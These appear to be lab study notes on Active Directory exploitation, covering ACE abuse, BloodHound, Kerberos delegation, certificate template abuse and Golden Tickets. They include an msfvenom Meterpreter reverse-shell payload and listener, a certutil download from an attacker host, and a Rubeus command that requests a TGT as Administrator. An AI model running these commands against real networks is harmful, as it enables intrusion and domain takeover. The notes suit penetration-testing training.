## üîì Access Control Entry Exploitation

Access Control Entries (ACEs) define permissions for Active Directory (AD) objects. Misconfigured ACEs facilitate lateral movement and privilege escalation. Notable exploitable ACEs include:

* ForceChangePassword: Set a target user's password without prior knowledge of the current credential.
* AddMembers: Append arbitrary entities (users, groups, or computers) to a target group.
* GenericAll: Total object control, including password modification, SPN registration, and group manipulation.
* GenericWrite: Update non-protected parameters (e.g., modifying the scriptPath parameter to execute a payload upon user logon).
* WriteOwner: Modify object ownership to acquire additional privileges over the object.
* WriteDACL: Inject new ACEs into the target's Discretionary Access Control List (DACL) to grant full operational control.
* AllExtendedRights: Execute actions associated with extended AD rights, such as forced password resets.

Exploitation requires AD interaction methods. AD-RSAT PowerShell cmdlets or PowerSploit modules are standard toolsets, selected based on environmental detection mechanisms.

## üêï BloodHound Enumeration

BloodHound visualizes AD object relationships and permission structures to identify attack paths.



Prior to ingesting SharpHound collection data (located in `/root/Rooms/ExploitingAD/`), the underlying Neo4j graph database must be initialized.

```bash
# Initialize the Neo4j graph database service for BloodHound
sudo neo4j start
```
* Tool: Neo4j

## üéüÔ∏è Kerberos Delegation Attacks

Kerberos Delegation permits an application to access resources on independent servers using impersonated client credentials. 



Constrained Delegation restricts the scope of delegable services to limit exposure upon compromise. Standard delegable services include:
* HTTP: Pass-through authentication for web applications.
* CIFS: Common Internet File System delegation for network shares.
* LDAP: Directory service delegation for operations such as password resets.
* HOST: Delegation for comprehensive host-level activities.
* MSSQL: Pass-through authentication for database operations.

```powershell
# Import the PowerView module and query accounts with TrustedToAuth configurations
Import-Module C:\Tools\PowerView.ps1
Get-NetUser -TrustedToAuth
```
* Tool: PowerView

Delegation over HTTP/WSMAN facilitates PowerShell Remoting. Impersonating a Tier 1 Administrator yields elevated access over the targeted server infrastructure.

## üë§ Process Migration and Keylogging

The SYSTEM context lacks interactive user sessions, rendering keylogging payloads ineffective. Process migration into an active user session (e.g., explorer.exe) is mandatory to capture keystrokes.

```bash
# Generate a PowerShell Meterpreter reverse shell payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=exploitad LPORT=4444 -f psh -o shell.ps1
```
* Tool: MSFVenom

```bash
# Initialize a Metasploit listener to capture the inbound reverse shell connection
sudo msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST exploitad; set LPORT 4444; exploit"
```
* Tool: Metasploit Framework

```cmd
# Download the staged payload to the target machine via certutil
certutil.exe -urlcache -split -f http://<ATTACKER_IP>/shell.ps1
```
* Tool: Certutil

```meterpreter
# Enumerate running processes and filter for the user desktop shell
ps | grep "explorer"
```
* Tool: Meterpreter

## üìã Group Policy Object Manipulation

Group Policy Objects (GPOs) are virtual policy configurations stored within the SYSVOL directory, identified by unique GUIDs for domain replication.



Local Policy Configurations enforce critical system states:
* Application configurations (Firewall, Anti-Virus, AppLocker).
* Local Group membership (Administrators, Remote Desktop Users).
* Startup configurations (automated script execution).
* Security protocols (SMBv1 deprecation/support).

## üìú Certificate Services Exploitation

Active Directory Certificate Services (AD CS) is the Microsoft Public Key Infrastructure (PKI) implementation utilized for encryption, digital signatures, and authentication.

PKI Terminology:
* PKI: Infrastructure managing certificates and public key encryption.
* AD CS: Microsoft PKI implementation operating on domain controllers.
* CA: Certificate Authority responsible for certificate issuance.
* Certificate Template: Policy definitions governing issuance parameters.
* CSR: Certificate Signing Request submitted to a CA.
* EKU: Extended/Enhanced Key Usage identifiers dictating certificate applicability.

```cmd
# Dump verbose configuration data for all available certificate templates
certutil -Template -v > templates.txt
```
* Tool: Certutil



A certificate template is vulnerable (poisonous) if it meets the following parameter combination:
1. EKU permits Client Authentication.
2. CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT is enabled (allows arbitrary Subject Alternative Name specification).
3. CTPRIVATEKEY_FLAG_EXPORTABLE_KEY is enabled (private key extraction permitted).
4. The requesting principal possesses enrollment permissions.

Post-enrollment, the certificate is utilized to request a Kerberos Ticket Granting Ticket (TGT) on behalf of the impersonated user.

```cmd
# Request a Kerberos TGT using an extracted certificate and impersonated username
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:<path_to_certificate> /password:<certificate_file_password> /outfile:<output_tgt.kirbi> /domain:<target_domain> /dc:<dc_ip_address>
```
* Tool: Rubeus

## ü§ù Domain Trust and Golden Ticket Attacks

Trusts dictate inter-domain resource access within an AD forest.
* Directional: Access flows uni-directionally from a trusting domain to a trusted domain.
* Transitive: Trust relationships cascade across multiple trusted domains.



The KRBTGT account functions as the service account for the Kerberos Distribution Center (KDC). Compromise of the KRBTGT NTLM hash permits the forgery of unauthorized TGTs (Golden Ticket Attack), effectively acting as a rogue Ticket Granting Server (TGS).

Golden Ticket prerequisites:
1. Fully Qualified Domain Name (FQDN).
2. Domain Security Identifier (SID).
3. Target impersonation username.
4. KRBTGT account NTLM password hash.
